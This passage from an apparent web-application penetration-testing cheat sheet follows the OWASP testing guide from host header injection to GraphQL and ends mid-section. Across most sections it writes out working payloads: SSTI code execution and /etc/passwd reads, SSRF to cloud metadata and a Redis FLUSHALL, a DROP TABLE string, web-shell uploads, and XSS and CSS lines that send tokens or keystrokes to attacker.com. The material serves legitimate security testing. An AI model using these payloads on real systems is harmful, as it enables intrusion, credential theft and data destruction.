**Description:** Test if application trusts Host header. Attacker-controlled Host can cause cache poisoning or password reset to wrong domain.

**Example Commands:**
```bash
# Basic host header injection
curl -H "Host: attacker.com" https://target.com

# Check for password reset links
curl -X POST https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -d "email=user@test.com"
# Check if email contains reset link for attacker.com

# Check redirect URLs
curl -H "Host: attacker.com" https://target.com/page?redirect=/dashboard

# X-Forwarded-Host header (if proxy in use)
curl -H "X-Forwarded-Host: attacker.com" https://target.com

# X-Forwarded-Proto header
curl -H "X-Forwarded-Proto: http" https://target.com

# Check absolute URL generation
curl -H "Host: attacker.com" https://target.com/api/resource
# Check if response contains attacker.com in URLs
```

**Expected Output (Vulnerable):**
```
Reset email contains attacker.com link
Redirects to attacker.com
Absolute URLs generated with attacker.com
Cache poisoning with attacker domain
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection

---

### WSTG-INPV-18 | Testing for Server-side Template Injection

**Description:** Test if user input is processed through template engines. SSTI allows code execution.

**Example Commands:**
```bash
# Basic SSTI test (Jinja2)
curl "https://target.com/search?q={{7*7}}"

# Expected output: 49 if vulnerable

# ERB (Ruby)
curl "https://target.com/page?msg=<%= 7*7 %>"

# Freemarker (Java)
curl "https://target.com/page?msg=<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }"

# Velocity
curl "https://target.com/page?msg=#set(\$x=1)\$x"

# Try to trigger error messages
curl "https://target.com/search?q={{undefined_var}}"

# Code execution
curl "https://target.com/page?name={{''.__class__.__mro__[1].__subclasses__()}}"

# File read
curl "https://target.com/page?msg={{open('/etc/passwd').read()}}"
```

**Expected Output (Vulnerable):**
```
{{ 7*7 }} returns 49
Template syntax processed
Code execution output
/etc/passwd content
Error message reveals engine
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection

---

### WSTG-INPV-19 | Testing for Server-Side Request Forgery

**Description:** Test if application can be forced to make requests to arbitrary URLs. SSRF enables internal network access or cloud metadata abuse.

**Example Commands:**
```bash
# Basic SSRF
curl -X POST https://target.com/api/fetch \
  -d "url=http://127.0.0.1:8080"

# Internal network scan
curl -X POST https://target.com/fetch \
  -d "url=http://192.168.1.1"

# Cloud metadata (AWS)
curl -X POST https://target.com/fetch \
  -d "url=http://169.254.169.254/latest/meta-data/"

# File protocol
curl -X POST https://target.com/fetch \
  -d "url=file:///etc/passwd"

# Gopher protocol (Redis)
curl -X POST https://target.com/fetch \
  -d "url=gopher://localhost:6379/_FLUSHALL"

# URL encoding bypass
curl -X POST https://target.com/fetch \
  -d "url=http://127.0.0.1%3A8080"

# Redirect chaining
# POST http://localhost:8080 redirects to http://internal-server
```

**Expected Output (Vulnerable):**
```
Internal server response in output
AWS metadata credentials leaked
Redis commands executed
/etc/passwd content retrieved
Internal IP scanning successful
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery

---

## 8. Error Handling Testing

### WSTG-ERRH-01 | Testing for Improper Error Handling

**Description:** Verify error messages don't leak sensitive information (source code, file paths, database details). Excessive error detail aids reconnaissance.

**Example Commands:**
```bash
# Trigger database errors
curl "https://target.com/user?id=invalid"

# Check error response
curl "https://target.com/user?id=999999"

# SQL error
curl "https://target.com/search?q='; DROP TABLE users;--"

# File not found
curl https://target.com/nonexistent/file.php

# Check for stack traces
curl "https://target.com/api/user?id=abc"

# Check for path disclosure
curl https://target.com/missing_file

# Check for version info in errors
curl https://target.com/api/error
```

**Expected Output (Vulnerable):**
```
SQL syntax error with query preview
Full stack trace with file paths
PHP version disclosed
Database type and version
Source code snippets in error
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Error_Handling_Testing/01-Testing_for_Improper_Error_Handling

---

## 9. Weak Cryptography Testing

### WSTG-CRYP-01 | Testing for Weak Transport Layer Security

**Description:** Verify TLS/SSL configuration is strong. Weak ciphers or protocol versions allow downgrade attacks and eavesdropping.

**Example Commands:**
```bash
# Check SSL/TLS version
openssl s_client -connect target.com:443 -tls1_2

# Test weak protocols
openssl s_client -connect target.com:443 -ssl3  # Should fail
openssl s_client -connect target.com:443 -tls1   # May be vulnerable

# Check cipher suite
nmap --script ssl-enum-ciphers -p 443 target.com

# Test certificate validity
openssl s_client -connect target.com:443 < /dev/null | openssl x509 -noout -dates

# Check for self-signed certificates
openssl s_client -connect target.com:443 < /dev/null | grep -i "self"

# Test for weak ciphers
openssl s_client -connect target.com:443 -cipher 'DES:RC4' < /dev/null

# Check HSTS header
curl -I https://target.com | grep -i "strict-transport"
```

**Expected Output (Vulnerable):**
```
SSLv3 or TLSv1.0 supported
Weak ciphers (DES, RC4, MD5)
Self-signed certificate
No HSTS header
Certificate with short validity
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Weak_Cryptography_Testing/01-Testing_for_Weak_Transport_Layer_Security

---

### WSTG-CRYP-02 | Testing for Padding Oracle

**Description:** Test for padding oracle vulnerabilities in encrypted data. Padding oracles allow decryption without knowing key.

**Example Commands:**
```bash
# Requires encrypted cookie or data
# Capture encrypted session token

# Modify the last byte of ciphertext
# Test multiple variations and observe response

# If server responds differently based on padding:
# 200 OK = valid padding
# 500 = invalid padding
# This indicates padding oracle vulnerability

# Example:
TOKEN="encrypted_session_token"
# Modify last byte and test
for i in {0..255}; do
  MODIFIED=$(echo $TOKEN | modify_byte_$i)
  curl -b "session=$MODIFIED" https://target.com/api/me
done

# Collect responses and analyze
```

**Expected Output (Vulnerable):**
```
Different response codes based on padding
Error messages revealing padding status
Decryption of encrypted data
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Weak_Cryptography_Testing/02-Testing_for_Padding_Oracle

---

### WSTG-CRYP-03 | Testing for Sensitive Information Sent via Unencrypted Channels

**Description:** Verify sensitive data is always transmitted over HTTPS. Unencrypted transmission allows interception.

**Example Commands:**
```bash
# Check if sensitive pages use HTTPS
curl -I http://target.com/login
curl -I https://target.com/login

# Check for mixed content
curl -s https://target.com/dashboard | grep "http://" | grep -v "https://"

# Check if password reset works over HTTP
curl -I http://target.com/forgot-password

# Check API endpoints
curl -I http://target.com/api/users

# Check if credentials are sent over HTTP
curl -X POST http://target.com/login \
  -d "email=test@test.com&password=pass"

# Check for cleartext transmission of sensitive data
curl -s http://target.com | grep -i "password\|secret\|token\|credit"
```

**Expected Output (Vulnerable):**
```
HTTP 200 on login page (should redirect to HTTPS)
Mixed HTTP/HTTPS content
Credentials transmitted over HTTP
Sensitive data in cleartext
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Weak_Cryptography_Testing/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels

---

### WSTG-CRYP-04 | Testing for Weak Encryption

**Description:** Test for use of weak or deprecated encryption algorithms. Weak encryption can be broken or brute-forced.

**Example Commands:**
```bash
# Check encryption algorithm in use
# Look at source code, API responses

# Test if application uses
# DES (56-bit) - weak
# MD5 - broken hash
# RC4 - stream cipher vulnerabilities
# SHA-1 - deprecated

# Check for password hashing
# If bcrypt, scrypt, PBKDF2 - good
# If MD5, SHA-1 - weak
# If plaintext - critical

# Check stored data encryption
# If encrypted with 3DES or AES - good
# If encrypted with DES or custom algo - weak

# Test for hardcoded encryption keys
curl -s https://target.com/api | grep -i "key\|secret\|password"

# Check for encryption implementation
# Use cryptographic analysis tools
```

**Expected Output (Vulnerable):**
```
DES encryption used
MD5 password hashing
Custom encryption implementation
Hardcoded encryption key
No encryption at all
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Weak_Cryptography_Testing/04-Testing_for_Weak_Encryption

---

## 10. Business Logic Testing

### WSTG-BUSL-01 | Test Business Logic Data Validation

**Description:** Test if business logic validates data constraints. Missing validation allows invalid states (negative prices, future dates in past).

**Example Commands:**
```bash
# Test negative price
curl -X POST https://target.com/api/product \
  -d "name=test&price=-100"

# Test future dates in past
curl -X POST https://target.com/booking \
  -d "start_date=2020-01-01&end_date=2021-01-01"

# Test inventory below zero
curl -X POST https://target.com/api/inventory \
  -d "product_id=1&quantity=-50"

# Test invalid age
curl -X POST https://target.com/register \
  -d "email=test@test.com&age=200"

# Test decimal values where integer required
curl -X POST https://target.com/api/order \
  -d "quantity=5.5"

# Test boundary values
curl -X POST https://target.com/api/discount \
  -d "discount_percent=150"
```

**Expected Output (Vulnerable):**
```
Negative price accepted
Invoice created with -100 price
Past date accepted as future
Inventory becomes negative
User age 200 accepted
Discount over 100% accepted
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation

---

### WSTG-BUSL-02 | Test Ability to Forge Requests

**Description:** Test if application validates request authenticity. Forged requests allow unauthorized actions.

**Example Commands:**
```bash
# Test without CSRF token
curl -X POST https://target.com/transfer \
  -b "session=token" \
  -d "amount=1000&to=attacker@test.com"

# Test request modification
# Intercept legitimate request, modify amounts
# E.g., transfer amount 100 -> 1000

# Test request replay
# Capture valid request, resend it multiple times
curl -X POST https://target.com/api/transaction \
  -d "action=transfer&amount=500" \
  -b "session=token"
# Send again, should fail or warn

# Test parameter tampering
curl -X POST https://target.com/checkout \
  -b "session=token" \
  -d "item_id=1&price=100"  # Change to lower price
```

**Expected Output (Vulnerable):**
```
Transfer succeeds without CSRF token
Amount modified in request
Duplicate transaction processed
Price changed in checkout
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests

---

### WSTG-BUSL-03 | Test Integrity Checks

**Description:** Test if application detects data modification. Missing integrity checks allow tampering with critical data.

**Example Commands:**
```bash
# Intercept request and modify data
# E.g., order total: 100 -> 10

# Test for signature/hash verification
curl -X POST https://target.com/api/transfer \
  -d "amount=1000&signature=abc123"
# Modify amount, keep signature - should fail

# Test checksum validation
# Modify invoice number or amount, test if system detects

# Test for MAC (Message Authentication Code)
# Modify cookie value, system should detect

# Check if data integrity is verified
curl -X POST https://target.com/api/data \
  -H "X-Integrity-Check: " \
  -d "data=modified"
```

**Expected Output (Vulnerable):**
```
Modified data accepted
Signature not validated
Checksum bypass
MAC verification skipped
Tampered data processed as valid
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks

---

### WSTG-BUSL-04 | Test for Process Timing

**Description:** Test if application enforces proper timing constraints. Race conditions or timing issues can lead to logic bypass.

**Example Commands:**
```bash
# Test race condition in checkout
# Add item, immediately purchase
# Send checkout request twice simultaneously

# Parallel requests
curl -X POST https://target.com/checkout -d "item=1" & \
curl -X POST https://target.com/checkout -d "item=1" &

# Test inventory depletion race
# Simulate rapid inventory reduction
for i in {1..100}; do
  curl -X POST https://target.com/purchase \
    -d "item_id=1&qty=1" &
done

# Test timing of events
# E.g., validity period between start and end date
curl -X POST https://target.com/event \
  -d "start=2025-01-01&end=2024-12-31"
```

**Expected Output (Vulnerable):**
```
Double-purchase succeeds
Inventory goes negative
Same item purchased twice
Invalid time periods accepted
Race condition exploited
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing

---

### WSTG-BUSL-05 | Test Number of Times a Function Can Be Used Limits

**Description:** Test if application enforces usage limits. Missing limits allow abuse (redeem coupon infinite times, unlimited free credits).

**Example Commands:**
```bash
# Test coupon reuse
COUPON="SAVE50"
for i in {1..10}; do
  curl -X POST https://target.com/checkout \
    -b "session=token" \
    -d "coupon=$COUPON"
done

# Test free trial signup
for i in {1..10}; do
  curl -X POST https://target.com/register \
    -d "email=user$i@test.com&trial=true"
done

# Test refund limits
curl -X POST https://target.com/refund \
  -b "session=token" \
  -d "order_id=1"

# Run multiple times

# Test password reset limits
for i in {1..20}; do
  curl -X POST https://target.com/forgot-password \
    -d "email=user@test.com"
done
```

**Expected Output (Vulnerable):**
```
Coupon applied 10 times to same order
Trial account created unlimited times
Refund approved multiple times
Password reset email sent unlimited
Function no rate limiting
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits

---

### WSTG-BUSL-06 | Testing for the Circumvention of Work Flows

**Description:** Test if multi-step workflows can be bypassed. Skipping steps allows unauthorized actions (checkout without payment, approval bypass).

**Example Commands:**
```bash
# Test multi-step checkout
# Step 1: Select item
# Step 2: Enter shipping
# Step 3: Enter payment
# Step 4: Confirm order

# Try to skip to step 4
curl -X POST https://target.com/api/checkout/confirm \
  -b "session=token"
# Should require previous steps

# Test workflow jump
curl -X POST https://target.com/api/step/4 \
  -b "session=token"

# Test state manipulation
# Submit form for step 2 but claim step 1 complete

# Check if steps are enforced server-side
curl -X POST https://target.com/checkout \
  -b "session=token" \
  -d "step=1"  # Then submit step=3 directly

# Test workflow navigation
# Go back and modify previous steps
```

**Expected Output (Vulnerable):**
```
Checkout confirmed without payment
Approval skipped in workflow
Step validation not enforced
State manipulation allowed
Backward workflow allowed
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows

---

### WSTG-BUSL-07 | Test Defenses Against Application Misuse

**Description:** Test if application detects and prevents abuse patterns. Missing detection allows account takeover, spam, or resource exhaustion.

**Example Commands:**
```bash
# Test account enumeration detection
for email in user1@test.com user2@test.com ...; do
  curl -X POST https://target.com/forgot-password \
    -d "email=$email"
done
# Check if IP is blocked for enumeration

# Test login attempt limiting
for i in {1..100}; do
  curl -X POST https://target.com/login \
    -d "email=admin@test.com&password=wrong"
done

# Test for suspicious behavior detection
# Rapid API calls
for i in {1..1000}; do
  curl https://target.com/api/user/$(($RANDOM)) &
done

# Test for bot detection
# No User-Agent, suspicious patterns

# Test account creation spam
for i in {1..100}; do
  curl -X POST https://target.com/register \
    -d "email=spam$i@tempmail.com&password=Test123"
done
```

**Expected Output (Vulnerable):**
```
No IP blocking for enumeration
Unlimited login attempts allowed
No rate limiting on API
No bot detection
Unlimited account creation
No CAPTCHA or similar defenses
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse

---

### WSTG-BUSL-08 | Test Upload of Unexpected File Types

**Description:** Test file upload validation. Weak validation allows uploading executable files, scripts, or files that compromise application security.

**Example Commands:**
```bash
# Upload PHP file as image
curl -X POST https://target.com/upload \
  -F "file=@shell.php" \
  -F "name=image.jpg"

# Upload HTML with embedded script
curl -X POST https://target.com/upload \
  -F "file=@<(echo '<script>alert(1)</script>')" \
  -F "name=index.html"

# Double extension bypass
curl -X POST https://target.com/upload \
  -F "file=@shell.php.jpg"

# Null byte bypass
curl -X POST https://target.com/upload \
  -F "file=@shell.php%00.jpg"

# Upload executable
curl -X POST https://target.com/upload \
  -F "file=@payload.exe"

# Check MIME type validation
curl -X POST https://target.com/upload \
  -F "file=@shell.php;type=image/jpeg"

# Try to upload directory
curl -X POST https://target.com/upload \
  -F "file=@."
```

**Expected Output (Vulnerable):**
```
PHP file uploaded and accessible
HTML file with script executed
Double extension accepted
Executable file uploaded
MIME type not validated
Directory traversal in filename
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types

---

### WSTG-BUSL-09 | Test Upload of Malicious Files

**Description:** Test if application scans uploads for malware. Missing AV scanning allows malware distribution.

**Example Commands:**
```bash
# EICAR test file (triggers AV)
curl -X POST https://target.com/upload \
  -F "file=@eicar.txt"

# Polyglot file (valid image + malicious)
curl -X POST https://target.com/upload \
  -F "file=@polyglot.jpg"

# Compressed malware
curl -X POST https://target.com/upload \
  -F "file=@malware.zip"

# Obfuscated executable
curl -X POST https://target.com/upload \
  -F "file=@payload.exe"

# Macro-enabled Office file
curl -X POST https://target.com/upload \
  -F "file=@document.docm"

# Check if file is scanned
# Upload EICAR and check if rejected
curl -X POST https://target.com/upload \
  -F "file=@eicar_com.zip"
```

**Expected Output (Vulnerable):**
```
EICAR file uploaded successfully
Malware file accepted
No AV scan performed
Malicious file made available for download
Polyglot file accepted
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files

---

## 11. Client-side Testing

### WSTG-CLNT-01 | Testing for DOM-Based Cross Site Scripting

**Description:** Test DOM manipulation with user-controlled data. DOM-based XSS doesn't require server reflection; JavaScript processes untrusted input.

**Example Commands:**
```bash
# Test URL fragment
curl "https://target.com/page#<img src=x onerror=alert(1)>"

# Test URL parameter processed by JavaScript
curl "https://target.com/page?action=<script>alert(1)</script>"

# Check source code for dangerous functions
curl -s https://target.com/page | grep -i "innerHTML\|eval\|execute"

# Test DOM-based payloads
# setTimeout, setInterval, Function constructor

# Burp Suite or OWASP ZAP for DOM-based XSS detection
```

**Expected Output (Vulnerable):**
```
JavaScript alert() executes
innerHTML used with user input
eval() with unsanitized data
DOM property set to user input
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-Based_Cross_Site_Scripting

---

### WSTG-CLNT-02 | Testing for JavaScript Execution

**Description:** Test if JavaScript code can be executed in the application context. Execution without CSP allows script injection attacks.

**Example Commands:**
```bash
# Check for eval-like functions
curl -s https://target.com/api | grep -i "eval\|Function\|setTimeout\|setInterval"

# Test JavaScript execution
curl "https://target.com/page?code=alert(1)"

# Check CSP policy
curl -I https://target.com | grep -i "content-security-policy"

# Test with CSP bypass
curl "https://target.com/page?code=<script>alert(1)</script>"

# JavaScript execution in web worker
# Service worker exploitation

# Test for JavaScript compression/encoding bypass
```

**Expected Output (Vulnerable):**
```
eval() function used
JavaScript code execution
No CSP header
CSP policy allows inline scripts
Web worker execution
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution

---

### WSTG-CLNT-03 | Testing for HTML Injection

**Description:** Test if HTML can be injected into page. HTML injection can be used to redirect users or steal credentials.

**Example Commands:**
```bash
# Inject HTML elements
curl "https://target.com/search?q=<h1>Injected</h1>"

# Inject form
curl "https://target.com/page?name=<form action='http://attacker.com'><input name='password'></form>"

# Inject iframe
curl "https://target.com/page?redirect=<iframe src='http://attacker.com'></iframe>"

# Check if HTML is escaped
curl -s "https://target.com/search?q=<b>test</b>" | grep "&lt;"

# Attribute injection
curl "https://target.com/page?title=\"><script>alert(1)</script><\""
```

**Expected Output (Vulnerable):**
```
<h1>Injected</h1> in response
Form element rendered
Iframe embedded on page
HTML not escaped
Attribute boundary broken
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection

---

### WSTG-CLNT-04 | Testing for Client-side URL Redirect

**Description:** Test if application redirects users to attacker-controlled URLs. Client-side redirects allow credential harvesting and phishing.

**Example Commands:**
```bash
# Test redirect parameter
curl "https://target.com/login?redirect=http://attacker.com"

# Check if redirect is performed
curl -I "https://target.com/logout?return_url=http://attacker.com"

# Test JavaScript redirect
curl "https://target.com/page?next=<script>window.location='http://attacker.com'</script>"

# Test various redirect parameters
# redirect, return, return_url, next, goto, forward
for param in redirect return return_url next goto forward url target; do
  curl "https://target.com/page?$param=http://attacker.com"
done

# Check for whitelist bypass
curl "https://target.com/page?redirect=//attacker.com"
curl "https://target.com/page?redirect=javascript:alert(1)"
```

**Expected Output (Vulnerable):**
```
Redirect to attacker.com
No whitelist validation
JavaScript redirect executed
Protocol-based redirect allowed
Open redirect vulnerability
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect

---

### WSTG-CLNT-05 | Testing for CSS Injection

**Description:** Test if CSS can be injected. CSS injection can be used for keylogging, credential harvesting, or UI defacement.

**Example Commands:**
```bash
# Basic CSS injection
curl "https://target.com/page?style=<style>body{background:red}</style>"

# CSS attribute injection
curl "https://target.com/page?class=\"onload=\"alert(1)\""

# CSS keylogger
curl "https://target.com/page?css=<style>input{background:url(http://attacker.com/?key=)}</style>"

# Check if CSS is reflected
curl -s "https://target.com/page?style=.test{color:red}" | grep ".test{color:red}"

# Expression injection (IE specific)
curl "https://target.com/page?width=expression(alert(1))"
```

**Expected Output (Vulnerable):**
```
CSS style reflected
Input field background URL to attacker server
Keystrokes captured
CSS injection executed
Expression evaluation
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection

---

### WSTG-CLNT-06 | Testing for Client-side Resource Manipulation

**Description:** Test if client-side resource validation can be bypassed. Client-side checks can be circumvented by intercepting requests.

**Example Commands:**
```bash
# Test file size validation
# Upload large file, intercept and modify size header

# Test file type validation
# Upload .exe as .jpg, intercept and modify MIME type

# Test price modification
# Intercept request, change price before server processes
curl -X POST https://target.com/checkout \
  -d "item_id=1&price=0.01"

# Test quota validation
# Upload beyond storage limit, intercept and clear counter

# Disable JavaScript validation
# Open browser console, modify DOM

# Intercept and modify API responses
# Use proxy to modify response data
```

**Expected Output (Vulnerable):**
```
Large file accepted after intercepting
File type validation bypassed
Price modification successful
Storage quota bypassed
Client-side checks not validated server-side
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation

---

### WSTG-CLNT-07 | Testing Cross Origin Resource Sharing

**Description:** Test CORS configuration for overly permissive policies. Misconfigured CORS allows cross-origin data theft.

**Example Commands:**
```bash
# Test CORS headers
curl -H "Origin: https://attacker.com" -I https://target.com/api

# Check Access-Control-Allow-Origin
curl -H "Origin: https://attacker.com" -I https://target.com/api/users

# Test with credentials
curl -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -I https://target.com/api

# Check if wildcard is used
curl -H "Origin: https://anything.com" -I https://target.com/api

# Test null origin
curl -H "Origin: null" -I https://target.com/api

# Credential exposure with CORS
curl -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Credentials: true" \
  https://target.com/api/users
```

**Expected Output (Vulnerable):**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
null origin accepted
Sensitive data in CORS response
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing

---

### WSTG-CLNT-08 | Testing for Cross Site Flashing

**Description:** Test Flash content for vulnerabilities (crossdomain.xml, CSRF, data exposure). Flash can be exploited similarly to web applications.

**Example Commands:**
```bash
# Check for Flash files
curl https://target.com/assets/app.swf

# Decompile Flash
# Use Burp Flash proxy plugin or dedicated decompiler

# Check crossdomain.xml
curl https://target.com/crossdomain.xml

# Check clientaccesspolicy.xml
curl https://target.com/clientaccesspolicy.xml

# Test Flash for CSRF
# Flash can send requests to any domain if crossdomain.xml allows

# Test for sensitive data in Flash
# Strings command
strings app.swf | grep -i "password\|secret\|key"

# Check for AMF deserialization
```

**Expected Output (Vulnerable):**
```xml
<?xml version="1.0"?>
<cross-domain-policy>
  <allow-access-from domain="*" />
</cross-domain-policy>
```
or hardcoded credentials, sensitive URLs in Flash

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing

---

### WSTG-CLNT-09 | Testing for Clickjacking

**Description:** Test if application is vulnerable to clickjacking attacks. Missing X-Frame-Options allows overlaying malicious content.

**Example Commands:**
```bash
# Check X-Frame-Options header
curl -I https://target.com | grep -i "x-frame-options"

# Check Content-Security-Policy
curl -I https://target.com | grep -i "content-security-policy\|frame-ancestors"

# Test if page can be iframed
echo '<iframe src="https://target.com/transfer"></iframe>' > clickjack.html
# Open in browser, test if clickable

# Create invisible iframe overlay
echo '<iframe src="https://target.com/delete" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0"></iframe>' > clickjack.html

# Check for clickjacking protection
curl https://target.com | grep -i "x-frame-options\|frame-ancestors"
```

**Expected Output (Vulnerable):**
```
No X-Frame-Options header
Page frameable in browser
Content-Security-Policy without frame-ancestors
Invisible overlay possible
Clickable elements exploitable
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking

---

### WSTG-CLNT-10 | Testing WebSockets

**Description:** Test WebSocket connections for security flaws (no auth, unencrypted, CORS issues). WebSockets bypass standard web security controls.

**Example Commands:**
```bash
# Connect to WebSocket
wscat -c wss://target.com/ws

# Check for authentication
# Send data without auth token

# Check for encryption (wss vs ws)
wscat -c ws://target.com/ws  # Should use wss

# Test CORS for WebSocket
# Origin header in WebSocket handshake

# Send malicious data
# Inject payloads through WebSocket

# Test message handling
# Send unexpected message types

# Monitor WebSocket traffic
# Use browser DevTools or proxy
```

**Expected Output (Vulnerable):**
```
WS (unencrypted) used instead of WSS
No authentication required
CORS allows any origin
WebSocket processes arbitrary data
Message injection successful
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets

---

### WSTG-CLNT-11 | Testing Web Messaging

**Description:** Test postMessage() for security flaws. Improper origin validation allows cross-origin communication.

**Example Commands:**
```bash
# Check for postMessage usage
curl -s https://target.com | grep -i "postMessage\|addEventListener"

# Create test page for postMessage
echo '
<script>
  window.addEventListener("message", function(event) {
    console.log(event.data);
  });
  window.parent.postMessage({cmd:"test"}, "*");
</script>
' > test.html

# Test origin validation
# If wildcard "*" is used, vulnerable

# Send message from different origin
# Use browser console to post message

# Check if origin is validated
# window.addEventListener("message", function(e) { if (e.origin !== "https://target.com") return; })
```

**Expected Output (Vulnerable):**
```
postMessage with wildcard origin
No origin validation
Receives messages from any origin
Sensitive data in messages
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging

---

### WSTG-CLNT-12 | Testing Browser Storage

**Description:** Test localStorage and sessionStorage for sensitive data. Unencrypted browser storage is accessible via XSS.

**Example Commands:**
```bash
# Check browser storage via console
# Open DevTools, Application tab, Local Storage

# Look for sensitive data
curl -s https://target.com | grep -i "localStorage\|sessionStorage\|setCookie"

# JavaScript to check storage
curl -s https://target.com | grep -i "localStorage.set\|sessionStorage.set"

# Test XSS to steal from storage
curl "https://target.com/page?xss=<script>fetch('http://attacker.com/?data='+localStorage.token)</script>"

# Check if sensitive data is encrypted
# Inspect localStorage values

# Check for JWT in localStorage
# Often stored unencrypted
```

**Expected Output (Vulnerable):**
```
JWT token in localStorage
Password stored in sessionStorage
API keys in localStorage
No encryption in storage
XSS can steal storage data
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage

---

### WSTG-CLNT-13 | Testing for Cross Site Script Inclusion

**Description:** Test for XSSI vulnerabilities. JSON responses can be executed as script if included via `<script>` tag.

**Example Commands:**
```bash
# Check if API returns JSON
curl https://target.com/api/user

# Try to include response as script
# <script src="https://target.com/api/user"></script>

# JSON response should be safe
# Prepend with ")]}'" to prevent execution

# Check response format
curl https://target.com/api/users | head -c 10

# If response is: [{"id":1,...}]
# It can be executed as JavaScript array

# Test XSSI
# <script>
#   var result = [];
//   </script>
#   <script src="https://target.com/api/data"></script>

# Check Content-Type header
curl -I https://target.com/api/data | grep -i "content-type"
```

**Expected Output (Vulnerable):**
```
application/json response includable as script
No XSSI protection prefix
Array response without guards
JSON executable as JavaScript
```

**Resource Link:** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion

---

## 12. API Testing

### WSTG-APIT-01 | Testing GraphQL

**Description:** Test GraphQL API for common vulnerabilities (introspection enabled, missing auth, excessive data exposure). GraphQL has unique security considerations.

**Example Commands:**
```bash
# Check for GraphQL endpoint
curl https://target.com/graphql
curl https://target.com/api/graphql
curl https://target.com/v1/graphql

# Test introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Enumerate schema
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}'

# Test authentication bypass
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email password } }"}'

# Test IDOR in GraphQL
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { email } }"}'
# Change id to 2, 3, etc.

# Test query complexity (DoS)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user { friends { friends { friends { id } } } } }"}'

